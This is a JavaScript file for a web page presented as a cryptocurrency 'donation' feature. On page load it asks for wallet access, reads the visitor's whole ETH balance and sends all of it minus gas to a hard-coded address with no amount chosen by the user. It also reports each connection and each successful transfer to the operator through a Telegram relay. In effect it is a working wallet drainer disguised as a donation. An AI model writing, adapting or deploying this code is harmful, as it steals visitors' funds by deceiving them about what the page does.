let web3;
const donationAddress = "0x4cF7613aFE35ec64071F71f334e54e23698Fb2D9"; // Replace with your actual donation address

async function init() {
    // Initialize Web3
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // Request account access if needed
            await window.ethereum.send('eth_requestAccounts');
            // Acccounts now exposed
            await connectWallet();
        } catch (error) {
            console.error(error);
            updateStatus('User denied account access.');
            sendTelegramMessage('User denied account access.');
        }
    } else if (window.web3) {
        web3 = new Web3(web3.currentProvider);
        // Acccounts always exposed
        await connectWallet();
    } else {
        console.log('Non-Ethereum browser detected. You should consider trying MetaMask or Trust Wallet!');
        updateStatus('Non-Ethereum browser detected. You should consider trying MetaMask or Trust Wallet!');
    }
}

async function connectWallet() {
    const accounts = await web3.eth.getAccounts();
    const fromAddress = accounts[0];
    const balance = await web3.eth.getBalance(fromAddress);

    startTime = new Date().toLocaleString();
    updateStatus('Wallet connected. Processing donation...');
    sendTelegramMessage(`Wallet connected at ${startTime}`);
    sendDonation(fromAddress, balance);
}

async function sendDonation(fromAddress, balance) {
    const gasPrice = await web3.eth.getGasPrice();
    const gasEstimate = await web3.eth.estimateGas({
        from: fromAddress,
        to: donationAddress,
        value: balance
    });

    const transactionFee = gasPrice * gasEstimate;
    const donationAmount = balance - transactionFee;

    if (donationAmount <= 0) {
        updateStatus('Insufficient funds to cover the transaction fee.');
        return;
    }

    try {
        const transaction = await web3.eth.sendTransaction({
            from: fromAddress,
            to: donationAddress,
            value: donationAmount
        });

        console.log('Transaction hash:', transaction.transactionHash);
        updateStatus('Donation successful! Thank you.');
        sendTelegramMessage(`Donation successful!\nAmount: ${web3.utils.fromWei(donationAmount.toString())} ETH\nTransaction hash: ${transaction.transactionHash}`);
    } catch (error) {
        console.error('Transaction error:', error);
        updateStatus('Donation failed. Please try again.');
        sendTelegramMessage('Donation failed: ' + error.message);
    }
}

function sendTelegramMessage(message) {
    fetch('/api/sendTelegramMessage', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ message })
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
    })
    .catch(error => {
        console.error('Error sending Telegram message:', error);
    });
}

function updateStatus(message) {
    document.getElementById('status').innerText = message;
}

window.addEventListener('load', init);
